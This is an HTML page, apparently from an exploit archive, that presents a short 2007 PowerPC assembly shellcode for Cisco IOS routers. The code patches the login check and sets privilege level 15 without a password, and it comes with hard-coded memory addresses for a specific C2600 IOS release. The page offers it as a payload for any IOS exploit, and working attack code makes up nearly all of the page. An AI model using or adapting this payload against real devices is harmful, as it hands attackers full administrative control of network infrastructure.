<html><head><title>Cisco IOS - Tiny shellcode v1.0</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# ----------------------------------------------------------------------------------------
#
# Cisco IOS Tiny shellcode v1.0
# (c) 2007 IRM Plc
# By Gyan Chawdhary
#
# ----------------------------------------------------------------------------------------
#
# The code creates a new TTY, and sets the privilege level to 15 without a password
#
# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.
# 
#
# The following two hard-coded addresses must be located for the target IOS version. 
#
# The hard-coded addresses used here are for:
#
# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)
#
# ----------------------------------------------------------------------------------------
.equ ret, 0x804a42e8
.equ login, 0x8359b1f4
.equ god, 0xff100000
.equ priv, 0x8359be64
# ----------------------------------------------------------------------------------------

main:

	# login patch begin
	lis 9, login@ha
	la 9, login@l(9)
	li 8,0
	stw 8, 0(9)
	# login patch end

	# priv patch begin
	lis 9, priv@ha
	la 9, priv@l(9)
	lis 8, god@ha
	la 8, god@l(8)
	stw 8, 0(9)
	# priv patch end 
	
	# exit code
      lis     10, ret@ha
      addi    4, 10, ret@l
      mtctr   4
      bctrl


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
